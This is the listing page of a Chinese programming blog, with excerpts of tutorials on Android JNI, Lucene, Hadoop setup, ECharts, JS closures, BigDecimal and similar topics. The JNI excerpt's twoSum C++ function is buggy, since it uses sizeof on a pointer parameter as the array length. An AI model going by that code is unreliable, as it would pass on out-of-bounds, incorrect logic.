<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f535b803fad4c046d8c9b5c5d621691/" rel="bookmark">
			Android Jni开发-实战篇(CMake)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本例demo下载地址：JniDemo下载
简介 上篇介绍了Android Studio中CMake简单配置jni开发。不清楚的可以看
Android Jni开发-基础配置篇(CMake)
如果不想麻烦的话直接在示例Jni代码native-lib.cpp中添加自己的业务逻辑即可。但是这样当代码一多了的时候不好扩展也不好管理，因此这次来实践添加自己的Jni代码。
目标： 实现一个简单的jni函数sum(int a, int b)，返回a+b的结果。一个稍微复杂点的jni函数twoSum(int nums[], int target)，实现的是leetcode上的一个题目TwoSum，内容是给定数组及目标数字，返回符合目标数字的2个数的下标（数组类型）。
1、首先建立一个demo.h
该文件作为c++的头文件，声明要实现的函数。
#ifndef JNIDEMO_DEMO_H #define JNIDEMO_DEMO_H #endif //JNIDEMO_DEMO_H class Demo{ public: Demo(); int sum(int a, int b); int *twoSum(int nums[], int target); }; 2、建立demo.cpp文件实现算法。
该文件实现头文件声明的函数。
#include &lt;cstring&gt; #include "demo.h" Demo::Demo() { } int Demo::sum(int a, int b) { return a + b; } int* Demo::twoSum(int nums[], int target) { int length = sizeof(nums); if (length &lt; 2){ return nullptr; } int *result = nullptr; for (int i = 0; i &lt; length; i++){ for (int j = i + 1; j &lt; length; j++){ if (nums[i] + nums[j] == target){ result = new int[2]; result[0] = i; result[1] = j; break; } } } return result; } 3、创建demo-lib.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f535b803fad4c046d8c9b5c5d621691/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a914da9fdda2f0912ab5815dbae1384e/" rel="bookmark">
			js获取汉字的简拼、全拼、混拼
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;
&lt;script type="text/javascript" src="ChinesePY.js"&gt;
&lt;/script&gt; &lt;/head&gt; &lt;body style="font-size:12px"&gt;
&lt;form&gt;
输入内容： &lt;input type="text" οnkeyup="pym.innerHTML = sjd.GetJP(this.value);allpym.innerHTML=sjd.GetQP(this.value);
staffpym.innerHTML=sjd.GetHP(this.value);" /&gt; &lt;br /&gt;
拼 音 码： &lt;span id="pym"&gt;&lt;/span&gt;&lt;br /&gt;
拼音全码： &lt;span id="allpym"&gt;&lt;/span&gt;&lt;br /&gt;
混 拼 码： &lt;span id="staffpym"&gt;&lt;/span&gt;
&lt;/form&gt; &lt;/body&gt;
&lt;/html&gt;
需要引入的ChinesePY.js下载地址：https://download.csdn.net/download/stone0215/10923300
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3374294cea7f82203b3b3b19bf803618/" rel="bookmark">
			log4j,log4j2冲突问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目中使用了log4j2，而第三方jar包使用了log4j，可以通过引入log4j-1.2-api包，将log4j的日志桥接到log4j2，从而解决日志冲突问题
转载于:https://www.cnblogs.com/yjcblog/p/10282945.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21b942eba14c05ce909f5bf7b13fcf83/" rel="bookmark">
			laravel 基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		框架记录执行SQL \app\Providers\AppServiceProvider.php
在function boot 加入如下代码即可
\DB::listen( function ($sql) { foreach ($sql-&gt;bindings as $i =&gt; $binding) { if ($binding instanceof \DateTime) { $sql-&gt;bindings[$i] = $binding-&gt;format('\'Y-m-d H:i:s\''); } else { if (is_string($binding)) { $sql-&gt;bindings[$i] = "'$binding'"; } } } // Insert bindings into query $query = str_replace(array('%', '?'), array('%%', '%s'), $sql-&gt;sql); $query = vsprintf($query, $sql-&gt;bindings); // Save the query to file $logFile = fopen( storage_path('logs' . DIRECTORY_SEPARATOR . date('Y-m-d') . '_query.log'), 'a+' ); fwrite($logFile, date('Y-m-d H:i:s') .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21b942eba14c05ce909f5bf7b13fcf83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44138f63dc165fe379ce9a27fd08653e/" rel="bookmark">
			Lucene
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Luence 了解搜索技术 搜索引擎 一个搜索引擎由搜索器 、索引器 、检索器 和用户接口 四个部分组成。搜索器的功能是在互联网 中漫游，发现和搜集信息。索引器的功能是理解搜索器所搜索的信息，从中抽取出索引项，用于表示文档 以及生成文档库的索引表。检索器的功能是根据用户的查询在索引库中快速检出文档，进行文档与查询的相关度评价，对将要输出的结果进行排序，并实现某种用户相关性反馈机制。用户接口的作用是输入用户查询、显示查询结果、提供用户相关性反馈机制。
搜索引擎发展史 Google：1998年10月之前，Google只是美国斯坦福大学的一个小项目。1995年博士生Larry Page开始学习搜索引擎设计，于1997年9月15日注册了google.com 的域名。
百度：2000年1月，两位北大校友，李彦宏与好友徐勇在北京中关村创立了百度公司。
雅虎：1994年4月，斯坦福（Stanford）大学的两名博士生，美籍华人杨致远和美国人David Filo共同创办了超级目录索引（Yahoo），并成功地使搜索引擎的概念深入人心。从此搜索引擎进入了高速发展时期。
新浪：1998年12月1日，四通利方信息技术有限公司和华渊资讯公司宣布合并，成立新浪网公司并推出同名的中文网站。其搜索引擎技术的合作对象是百度公司。
搜狐：1998年2月，爱特信公司创办了“搜狐”大型中文网络系统。搜狐站点的内容大量采用了人工选择和分类，并提供“分类查询”和“关键词”两种方式检索。其搜索引擎技术的合作对象是百度公司。
搜索引擎的原理 爬行 搜索引擎是通过一种特定规律的软件跟踪网页的链接，从一个链接爬到另外一个链接，像蜘蛛在蜘蛛网上爬行一样，所以被称为“蜘蛛”也被称为“机器人”。搜索引擎蜘蛛的爬行是被输入了一定的规则的，它需要遵从一些命令或文件的内容。
抓取存储 搜索引擎是通过蜘蛛跟踪链接爬行到网页，并将爬行的数据存入原始页面数据库。其中的页面数据与用户浏览器得到的HTML是完全一样的。搜索引擎蜘蛛在抓取页面时，也做一定的重复内容检测，一旦遇到权重很低的网站上有大量抄袭、采集或者复制的内容，很可能就不再爬行。
预处理 搜索引擎将蜘蛛抓取回来的页面，进行各种步骤的预处理，包括：提取文字，中文分词，去停止词，消除噪音（搜索引擎需要识别并消除这些噪声，比如版权声明文字、导航条、广告等……），正向索引，倒排索引，链接关系计算，特殊文件处理。
除了HTML 文件外，搜索引擎通常还能抓取和索引以文字为基础的多种文件类型，如 PDF、Word、WPS、XLS、PPT、TXT 文件等。我们在搜索结果中也经常会看到这些文件类型。 但搜索引擎还不能处理图片、视频、Flash 这类非文字内容，也不能执行脚本和程序。
排名 用户在搜索框输入关键词后，排名程序调用索引库数据，计算排名显示给用户，排名过程与用户直接互动的。但是，由于搜索引擎的数据量庞大，虽然能达到每日都有小的更新，但是一般情况搜索引擎的排名规则都是根据日、周、月阶段性不同幅度的更新。
搜索技术的应用场景 搜索引擎广泛应用在大型综合搜索网站，如百度，谷歌等，也应用于系统的站内搜索。
实现搜索技术的方式 实现搜索技术可以从数据库本身出发，使用数据库的搜索命令来进行搜索，但是这种搜索的方式往往面临在数据量很大的情况下，模糊搜索不一定走索引，因此效率就会很低。
初次之外就是使用Lucene搜索技术，解决在海量数据的情况下，利用倒排索引技术，实现快速的搜索、打分、排序等功能。
Lucene概述 2.1 什么是Lucene 作为一个开放源代码项目，Lucene从问世之后，引发了开放源代码社群的巨大反响，程序员们不仅使用它构建具体的全文检索应用，而且将之集成到各种系统软件中去，以及构建Web应用，甚至某些商业软件也采用了Lucene作为其内部全文检索子系统的核心。apache软件基金会的网站使用了Lucene作为全文检索的引擎，IBM的开源软件eclipse的2.1版本中也采用了Lucene作为帮助子系统的全文索引引擎，相应的IBM的商业软件Web Sphere中也采用了Lucene。Lucene以其开放源代码的特性、优异的索引结构、良好的系统架构获得了越来越多的应用。
Lucene是一个高性能、可伸缩的信息搜索(IR)库。它可以为你的应用程序添加索引和搜索能力。Lucene是用java实现的、成熟的开源项目，是著名的Apache Jakarta大家庭的一员，并且基于Apache软件许可 [ASF, License]。同样，Lucene是当前非常流行的、免费的Java信息搜索(IR)库。
2.2 全文检索和倒排索引 计算机程序一个文档一个文档的扫描，对于每一个文档，从头看到尾，对每一词建立一个索引，指明该词在文章中出现的次数和位置，当用户查找数据时，索引程序就根据事先建立的索引进行查找，并将查找结果反馈给用户的检索方式。
2.3 Lucene与Solr的关系 Lucene是一套实现了全文检索的底层API，提供对于全文检索的基础支持，而Solr是全文检索引擎的一个实现产品，是一个企业级搜索应用服务器。
2.4 Lucene的下载 Lucene是Apache旗下的顶级项目，我们可以直接访问其官网进行下载和使用。
 目前最新的版本是7.x系列，但是大多数企业中依旧使用4.x版本，比较稳定。本次课程我们使用4.10.2版本。
Lucene的基本使用 使用Lucene的API来实现对索引的增（创建索引）、删（删除索引）、改（修改索引）、查（搜索数据）。
3.1 创建索引 3.1.1 创建索引的流程 3.1.2 添加依赖 使用Lucene需要添加Lucene的依赖。
lucene核心库 lucene-core
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44138f63dc165fe379ce9a27fd08653e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92731a1d9e5e3d4dc64bb7439bda32e0/" rel="bookmark">
			oracle SDO_ORDINATE_ARRAY直接展示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：https://www.cnblogs.com/zzl-156783663/p/9302249.html
mdsys.sdo_geometry 中SDO_ORDINATE存储的是空间对象的几何节点坐标序列，要想直接展示第一条值出来需要捞出数据
若select t.id,t.shape.sdo_ordinates from test1展示出来的是id和一个集合对象，我只需暂时集合对象第一个值或者某几个值出来可以建立一个函数展示
--读取SDO_ORDINATE_ARRAY中的元素
create or replace function get_value(td SDO_ORDINATE_ARRAY) return varchar2 is
t varchar2(50);
coulum_values varchar2(50);
begin
select column_value into t from table(td) where rownum=1;
return t;
end;
测试：
1、
select column_value into t from table(MDSYS.SDO_ORDINATE_ARRAY(5,1, 8,1, 8,6, 5,7, 5,1)) where rownum=1;
2、
直接执行select t.id,get_value(t.shape.sdo_ordinates) from test1 t ; 即可；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fe6d171aca3f0f976d9d2889d8dcc2e/" rel="bookmark">
			CentOS安装Hadoop单机版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、首先安装jdk
下载jdk-7u45-linux-x64.tar.gz 地址https://pan.baidu.com/s/1HlkngnG5H8JAdm0zYezEyg 提取码3z6s
放到/usr/local目录下
解压jdk，
tar -zxvf jdk-7u45-linux-x64.tar.gz
配置环境变量 vim /etc/profile 在文件末尾加上
JAVA_HOME=/usr/local/jdk1.7.0_45
export JAVA_HOME
export PATH=$JAVA_HOME/bin:$PATH
刷新环境变量配置 source /etc/profile
测试jdk安装是否成功，显示如下截图代表成功 java -version
2、安装hadoop2.9.2 下载hadoop2.9.2 地址http://mirrors.hust.edu.cn/apache/hadoop/common/
放到 /usr/local目录下 解压 tar -zxvf hadoop-2.9.2.tar.gz 查看 ll
配置hadoop环境变量 vim /etc/profile 添加如下配置
export HADOOP_HOME=/usr/local/hadoop-2.9.2
export PATH=$HADOOP_HOME/bin:$PATH
重新刷新配置 source /etc/profile
查看版本 hadoop version
配置几个配置文件，路径是 cd /usr/local/hadoop-2.9.2/etc/hadoop/
vim core-site.xml 添加如下配置
&lt;property&gt;
&lt;name&gt;fs.defaultFS&lt;/name&gt;
&lt;!-- 这里填的是你自己的ip，端口默认--&gt;
&lt;value&gt;hdfs://192.168.124.144:9000&lt;/value&gt;
&lt;/property&gt;
&lt;property&gt;
&lt;name&gt;hadoop.tmp.dir&lt;/name&gt;
&lt;!-- 这里填的是你自定义的hadoop工作的目录，端口默认--&gt;
&lt;value&gt;/usr/local/hadoop-2.9.2/tmp&lt;/value&gt;
&lt;/property&gt;
&lt;property&gt;
&lt;name&gt;hadoop.native.lib&lt;/name&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fe6d171aca3f0f976d9d2889d8dcc2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3af62e0ee6b5898055ac074d1f10619a/" rel="bookmark">
			数据结构（一）——逻辑结构和存储结构（易错）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.顺序表、哈希表、有序表和单链表中属于逻辑结构的是有序表。
解析：顺序表、哈希表和单链表表示几种数据结构，既描述逻辑结构，也描述存储结构和数据运算。而有序表是指关键字有序的线性表，可以链式存储也可以顺序存储，仅描述了元素之间的逻辑关系，属于逻辑结构。
2.循环队列、链表、哈希表和栈中与数据的存储结构无关的术语是栈。
解析：数据的存储结构有顺序存储、链式存储、索引存储和散列存储。循环队列是用是顺序表表示的队列，是一种数据结构。栈是一种抽象数据类型，可采用顺序存储或链式存储，只表示逻辑结构。
3.链式存储设计时，各个不同结点的存储空间可以不连续，但是结点内的存储单元地址则必须连续（每个结点都为结点域和数据域，这个结点内部为连续的）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0edb4c85035584e93bb32a3c516c29b4/" rel="bookmark">
			闭包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，什么是闭包
闭包就是能够读取其他函数内部变量的函数。
2，闭包的原理：
就是作用域访问原则，上级作用域无法直接访问下级作用域中的变量。
3，实现闭包要解决什么问题：
闭包内的数据不允许外界访问，要解决的问题就是间接访问该数据。函数内部的函数中可以访问该函数中的变量，但是我们需要在函数外部来访问函数中的变量。
4，怎么解决：
函数内部的方法可以访问该函数中的变量，我们可以把这个方法return 出去，函数外部就可以调用这个函数内部的方法来访问函数内部的变量了。
function foo(){ var num =123; return function(a){ if(a !== undefined){ //如果传参了，就用来设置值 num =a; }else{ //不传参，用来获取值 return num; } console.log(num); } } var fun1=foo(); fun1(456); var num=fun1(); console.log(num); 5，使用对象返回多个方法，来获取和设置值
function fun (){ var name ="jack" var age =18 return { getName:function(){ return name; }, setName:function(value){ name = value; }, getAge:function(){ return age; }, setAge:function(value){ age = value; } } } var obj = fun(); obj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0edb4c85035584e93bb32a3c516c29b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7e64b4647901732fcc7f53c7f970bda/" rel="bookmark">
			Spring Cloud项目启动脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#!/bin/bash source /etc/profile cd `dirname $0` BIN_DIR=`pwd` echo "$BIN_DIR"
#项目名称 SERVER_NAME="aid-cms-web" #服务器对应的config配置文件 PROFILE=test PIDS=`ps -ef | grep java | grep "$SERVER_NAME" | grep -v "grep" |awk '{print $2}'` if [ -n "$PIDS" ]; then echo "kill $SERVER_NAME PID: $PIDS" kill -9 $PIDS fi echo "backup start " BAK_DIR="$BIN_DIR/bak" if [ ! -d $BAK_DIR ]; then mkdir $BAK_DIR fi date=`date +%Y%m%d%H%M` bakJarName=${SERVER_NAME}.jar cp $BIN_DIR/$bakJarName $BAK_DIR/$bakJarName.$date echo "backup success $BAK_DIR/$bakJarName.$date" LOGS_DIR="$BIN_DIR/logs" if [ !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7e64b4647901732fcc7f53c7f970bda/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37d619f66959e21fe59efc927a1073b7/" rel="bookmark">
			linux /bin/bash^M: bad interpreter的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux下执行shell脚本时报错：-bash: ./a.sh: /bin/bash^M: bad interpreter: No such file or directory。
原因是windows下的文件是dos格式，即每一行结尾以\r\n来标识，而linux下的文件是unix格式，行尾则以\n来标识。
查看文件格式有三种方法：
1.cat -A &lt;filename&gt;，如果输出结果中行末尾是^M$，则是dos格式，如果行末尾只是$，则是unix格式。
2.vim &lt;filename&gt;，编辑文件，执行“:set ff”,若执行结果为fileformat=dos则为dos格式，若执行结果为fileformat=unix则为unix格式。
3.od -t x1 &lt;filename&gt;，以16进制查看文件，若输出结果中存在“0d 0a”则为dos格式，如果只有“0a”则为unix格式。其中“0d”即为回车符“\r”，“0a”即为换行符“\n”。
修改文件格式有三种方式：
1.sed -i "s/\r//" &lt;filename&gt;或sed -i "s/^M//" &lt;filename&gt;，直接将回车符替换为空字符串。
2.vim &lt;filename&gt;，编辑文件，执行“: set ff=unix”，将文件设置为unix格式，然后执行“:wq”，保存退出。
3.dos2unix &lt;filename&gt;或busybox dos2unix &lt;filename&gt;，如果提示command not found，可以使用前两种方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35bf28ba514fa4e9927d58b3913c0e33/" rel="bookmark">
			ubuntu安装openpose
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、使用Git直接下载openpose
git clone https://github.com/CMU-Perceptual-Computing-Lab/openpose.git
二、下载各种模型文件（比较大，可能需要几分钟到几个小时不等，看网速了）
进入openpose所在目录
cd models
sh ./getModels.sh（这个脚本就是用来下载各种已训练的模型的）
三、编译Caffe（GPU版）
此处多说两句：按照正常流程呢，直接跳过此步骤，直接执行下一步。打开cmake-gui工具生成编译文件... ...。在此过程中，你会发现cmake-gui会有个提示如下：
上边的提示就是在往3rdparty这个文件夹下克隆caffe的源码。这个caffe是特殊版本的，在3rdparty/caffe目录下执行：
git remote -v
会发现正在克隆的仓库地址为：
https://github.com/CMU-Perceptual-Computing-Lab/caffe.git
额...，等克隆完caffe后，cmake-gui会自动编译，但十有八九是失败的。因为编译GPU版本的caffe本身就有一堆坑！所以你可以事先克隆这个仓库，然后提前编译成功。再去执行下一步，基本就没啥大问题了。编译Caffe的具体过程，请参考其它文档，总之此时编译成功Caffe，在之后编译openpose时会省心的很。
在插一句题外话——在https://github.com/CMU-Perceptual-Computing-Lab/中，还有另外一个caffe版本，叫caffe_train，这个版本是用来训练openpose时用的。这个版本的caffe更坑爹，其对cuda，cudnn，opencv的版本有严格要求。想编译成功，要踩的坑异常的多。
四、利用cmake-gui生成build文件
如果没有安装cmake-gui工具，请先安装。安装方法很简单，百度一下。
在openpose目录下创建build文件夹：sudo mkdir build
在终端执行cmake-gui，在弹出界面中如下操作：
Configure完毕后，配置Caffe路径并Generate：
Generate之一步一般不会出错，完事后会在信息栏里输出“Generate done”字样。
五、开始编译openpose
cd build
sudo make -j8
六、编译openpose时可能遇到的问题
提示找不到caffe/proto/caffe.pb.h，导致编译失败。解决：
在openpose/3rdparty/caffe/目录下，终端操作：
caffe$ protoc src/caffe/proto/caffe.proto --cpp_out=.
caffe$ mkdir include/caffe/proto
caffe$ mv src/caffe/proto/caffe.pb.h include/caffe/proto/
七、测试
链接usb摄像头测试：
./build/examples/openpose/openpose.bin --face --hand
单独检测脸部关键点，或手部骨骼：
# Face ./build/examples/tutorial_api_cpp/06_face_from_image.bin --body 0 --face --face_detector 2 # Hands ./build/examples/tutorial_api_cpp/07_hand_from_image.bin --body 0 --hand --hand_detector 2 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd12ebe84649cdfcb456c6bee1c9dedb/" rel="bookmark">
			vscode 打开新文件覆盖窗口，始终显示一个窗口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一直在使用vscode 编辑器，里面的扩展用的比较舒服，但是最近遇到一个小问题，一直也没有找好的解决办法，今天无意中把问题给解决了。具体如下
之前使用编辑器，可以同时打开多个文件，而且是多窗口展示的，以tabs的类型展示
后来不知道自己怎么搞的，窗口给覆盖了
解决办法如下：
ctrl+shift+p 快捷键 打开 然后在搜索框中输入 settings
settings.json 这个文件是编辑器配置文件，
打开文件如下：
控制这个窗口展示的属性，workbench.editor.showTabs
搜索下，然后设置成
这个问题就解决了。。
之前百度说是 修改
“workbench.editor.enablePreview”: false, 其实没有作用；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95c7f7c4f999605173c00cca196eb70d/" rel="bookmark">
			Double转换成BigDecimal进行运算的整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Double转换成BigDecimal进行运算的整理 由于double进行加减乘除运算容易丢失精度，所以一般把double转换成BigDecimal进行调用BigDecimal的加减乘除方法进行运算之后在转成double类型
BigDecimal的运算（加减乘除）
BigDecimal bignum1 = new BigDecimal("10"); BigDecimal bignum2 = new BigDecimal("5"); BigDecimal bignum3 = null; //加法 bignum3 = bignum1.add(bignum2); System.out.println("和 是：" + bignum3); //减法 bignum3 = bignum1.subtract(bignum2); System.out.println("差 是：" + bignum3); //乘法 bignum3 = bignum1.multiply(bignum2); System.out.println("积 是：" + bignum3); //除法 bignum3 = bignum1.divide(bignum2); System.out.println("商 是：" + bignum3); double类型转化成 BigDecimal 类型进行 加减乘除 运算整理
public class Arith { /** * 提供精确加法计算的add方法 * @param value1 被加数 * @param value2 加数 * @return 两个参数的和 */ public static double add(double value1,double value2){ BigDecimal b1 = new BigDecimal(Double.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95c7f7c4f999605173c00cca196eb70d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1882291fb43ad3253416a326b9c4adcd/" rel="bookmark">
			Echarts 中国地图(包括china.js文件)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用Echarts写中国地图需要导入china.js（现在官方不提供下载，个人找的在最下面有）,根据需要的效果如下。位置可以自己在option里面修改
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; 首先，引入jquery.js echarts.js china.js(必要) &lt;script src="/jquery.js"&gt;&lt;/script&gt; &lt;script src="echarts.min.js"&gt;&lt;/script&gt; &lt;script src="china.js"&gt;&lt;/script&gt; &lt;head&gt; &lt;body&gt; 创建一个DIV容器 方便初始化 &lt;div id="china-map"&gt;&lt;/div&gt; &lt;script type="text/javascript"&gt; var myChart = echarts.init(document.getElementById('china-map')); function randomData() { return Math.round(Math.random() * 1000); } var data = [{ name: '云南', value1: randomData(), value2: randomData(), }, { name: '辽宁', value1: randomData(), value2: randomData(), }, { name: '黑龙江', value1: randomData(), value2: randomData(), }, { name: '湖南', value1: randomData(), value2: randomData(), },{ name: '福建', value1: randomData(), value2: randomData(), }, { name: '贵州', value1: randomData(), value2: randomData(), }, { name: '广东', value1: randomData(), value2: randomData(), }, { name: '青海', value1: randomData(), value2: randomData(), }, { name: '西藏', value1: randomData(), value2: randomData(), }, { name: '四川', value1: randomData(), value2: randomData(), }]; var resultdata0 = []; var sum0 = 0; var titledata = []; for (var i = 0; i &lt; data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1882291fb43ad3253416a326b9c4adcd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/409ff3911611f09d07f01873692e1068/" rel="bookmark">
			Echarts dataZoom缩放功能参数详解：
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		dataZoom=[ //区域缩放 { id: 'dataZoomX', show:true, //是否显示 组件。如果设置为 false，不会显示，但是数据过滤的功能还存在。 backgroundColor:"rgba(47,69,84,0)", //组件的背景颜色 type: 'slider', //slider表示有滑动块的，inside表示内置的 dataBackground:{ //数据阴影的样式。 lineStyle:mylineStyle, //阴影的线条样式 areaStyle:myareaStyle, //阴影的填充样式 }, fillerColor:"rgba(167,183,204,0.4)", //选中范围的填充颜色。 borderColor:"#ddd", //边框颜色。 filterMode: 'filter', //'filter'：当前数据窗口外的数据，被 过滤掉。即 会 影响其他轴的数据范围。每个数据项，只要有一个维度在数据窗口外，整个数据项就会被过滤掉。 xAxisIndex:0, //设置 dataZoom-inside 组件控制的 x轴,可以用数组表示多个轴 yAxisIndex:[0,2], //设置 dataZoom-inside 组件控制的 y轴,可以用数组表示多个轴 radiusAxisIndex:3, //设置 dataZoom-inside 组件控制的 radius 轴,可以用数组表示多个轴 angleAxisIndex:[0,2], //设置 dataZoom-inside 组件控制的 angle 轴,可以用数组表示多个轴 start: 30, //数据窗口范围的起始百分比,表示30% end: 70, //数据窗口范围的结束百分比,表示70% startValue:10, //数据窗口范围的起始数值 endValue:100, //数据窗口范围的结束数值。 orient:"horizontal", //布局方式是横还是竖。不仅是布局方式，对于直角坐标系而言，也决定了，缺省情况控制横向数轴还是纵向数轴。'horizontal'：水平。'vertical'：竖直。 zoomLock:false, //是否锁定选择区域（或叫做数据窗口）的大小。如果设置为 true 则锁定选择区域的大小，也就是说，只能平移，不能缩放。 throttle:100, //设置触发视图刷新的频率。单位为毫秒（ms）。 zoomOnMouseWheel:true, //如何触发缩放。可选值为：true：表示不按任何功能键，鼠标滚轮能触发缩放。false：表示鼠标滚轮不能触发缩放。'shift'：表示按住 shift 和鼠标滚轮能触发缩放。'ctrl'：表示按住 ctrl 和鼠标滚轮能触发缩放。'alt'：表示按住 alt 和鼠标滚轮能触发缩放。 moveOnMouseMove:true, //如何触发数据窗口平移。true：表示不按任何功能键，鼠标移动能触发数据窗口平移。false：表示鼠标滚轮不能触发缩放。'shift'：表示按住 shift 和鼠标移动能触发数据窗口平移。'ctrl'：表示按住 ctrl 和鼠标移动能触发数据窗口平移。'alt'：表示按住 alt 和鼠标移动能触发数据窗口平移。 left:"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/409ff3911611f09d07f01873692e1068/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/657f7dd95f703b11e0b4c6365ee6473e/" rel="bookmark">
			echarts ajax数据加载方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：
&lt;!-- 引入 echarts.js --&gt; &lt;script type="text/javascript" src="echarts.min.js"&gt;&lt;/script&gt; &lt;!-- 引入jquery.js --&gt; &lt;script type="text/javascript" src="jquery-1.12.3.js"&gt;&lt;/script&gt; 二：
&lt;!-- 为ECharts准备一个具备大小（宽高）的Dom --&gt; &lt;div id="main" style="width: 600px;height:400px;"&gt;&lt;/div&gt; 三：
function showView(){ $("#view").show(); //初始化echarts实例 var myChart = echarts.init(document.getElementById('view')); // 显示标题，图例和空的坐标轴 myChart.setOption({ title: { text: '异步数据加载示例' }, tooltip: {}, legend: { data:['注册数量'] }, xAxis: { data: [] }, yAxis: {}, series: [{ name: '注册数量', type: 'bar', data: [] }] }); myChart.showLoading(); //数据加载完之前先显示一段简单的loading动画 var names=[]; //日期数组（实际用来盛放X轴坐标值） var nums=[]; //注册数量数组（实际用来盛放Y坐标值） $.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/657f7dd95f703b11e0b4c6365ee6473e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c74bf9738e66548da10ece0cf2d87651/" rel="bookmark">
			Quartz时间配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		格式: [秒] [分] [小时] [日] [月] [周] [年]
